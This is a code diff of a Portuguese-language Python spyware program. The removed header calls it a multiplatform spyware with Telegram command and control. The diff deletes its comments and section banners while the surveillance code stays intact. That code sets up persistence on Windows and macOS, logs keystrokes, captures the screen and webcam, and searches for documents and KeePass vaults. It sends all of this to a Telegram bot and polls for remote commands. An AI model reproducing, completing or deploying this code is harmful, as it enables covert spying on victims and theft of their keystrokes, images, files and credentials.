@@ -1,5 +1,4 @@
-# spyware_multiplataforma.py - Versão 2.4.1 - C2 via Telegram
-# Requisitos: pip install opencv-python pillow requests pynput cryptography
+
 
 import os
 import sys
@@ -14,9 +13,7 @@ from PIL import ImageGrab
 from pynput import keyboard
 from cryptography.fernet import Fernet
 
-# ============================================================
-# CONFIGURAÇÕES (substitua pelos seus dados)
-# ============================================================
+
 TELEGRAM_TOKEN = ""
 TELEGRAM_CHAT_ID = ""
 SISTEMA = platform.system()
@@ -27,9 +24,7 @@ PASTA_OCULTA = os.path.join(
 CHAVE_FERNET = Fernet.generate_key()
 FERNET = Fernet(CHAVE_FERNET)
 
-# ============================================================
-# PERSISTÊNCIA
-# ============================================================
+
 def criar_persistencia():
     if SISTEMA == 'Windows':
         cmd = (
@@ -72,9 +67,7 @@ def criar_persistencia():
             )
         subprocess.run(['launchctl', 'load', plist], capture_output=True)
 
-# ============================================================
-# METADADOS
-# ============================================================
+
 def coletar_metadata():
     try:
         ip_interno = subprocess.run(
@@ -93,9 +86,7 @@ def coletar_metadata():
         "pasta_usuario": os.path.expanduser('~')
     }
 
-# ============================================================
-# KEYLOGGER
-# ============================================================
+
 class KeyLogger:
     def __init__(self):
         self.log = ""
@@ -123,9 +114,6 @@ class KeyLogger:
         with keyboard.Listener(on_press=self.callback) as listener:
             listener.join()
 
-# ============================================================
-# CAPTURAS
-# ============================================================
 def capturar_tela():
     try:
         imagem = ImageGrab.grab()
@@ -152,9 +140,7 @@ def capturar_webcam():
     except Exception:
         return None
 
-# ============================================================
-# EXFILTRAÇÃO DE ARQUIVOS
-# ============================================================
+
 def buscar_arquivos():
     alvos = ('.docx', '.xlsx', '.pdf', '.txt', '.zip', '.rar', '.jpg', '.png', '.db', '.kdbx')
     arquivos = []
@@ -173,9 +159,7 @@ def buscar_arquivos():
             break
     return arquivos[:5]
 
-# ============================================================
-# ENVIO TELEGRAM
-# ============================================================
+
 def enviar_dados(tipo, conteudo):
     try:
         if tipo == "texto":
@@ -203,9 +187,7 @@ def enviar_dados(tipo, conteudo):
     except Exception:
         pass
 
-# ============================================================
-# COMANDOS REMOTOS
-# ============================================================
+
 def processar_comandos():
     ultimo_comando = None
     while True:
@@ -247,38 +229,36 @@ def processar_comandos():
             pass
         time.sleep(60)
 
-# ============================================================
-# MAIN
-# ============================================================
+
 def main():
     os.makedirs(PASTA_OCULTA, exist_ok=True)
     criar_persistencia()
 
-    # Envia metadata inicial
+
     enviar_dados("texto", f"SPYWARE ATIVO\n{json.dumps(coletar_metadata(), indent=2)}")
 
-    # Keylogger em thread
+   
     kl = KeyLogger()
     threading.Thread(target=kl.iniciar, daemon=True).start()
 
-    # Comandos em thread
+ 
     threading.Thread(target=processar_comandos, daemon=True).start()
 
-    # Loop principal
+    
     while True:
         try:
-            # Tela a cada 30s
+           
             arq = capturar_tela()
             if arq:
                 enviar_dados("arquivo", arq)
 
-            # Webcam a cada 5min
+           
             if int(time.time()) % 300 < 5:
                 arq = capturar_webcam()
                 if arq:
                     enviar_dados("arquivo", arq)
 
-            # Arquivos a cada 10min
+            
             if int(time.time()) % 600 < 10:
                 for arq in buscar_arquivos():
                     enviar_dados("arquivo", arq)
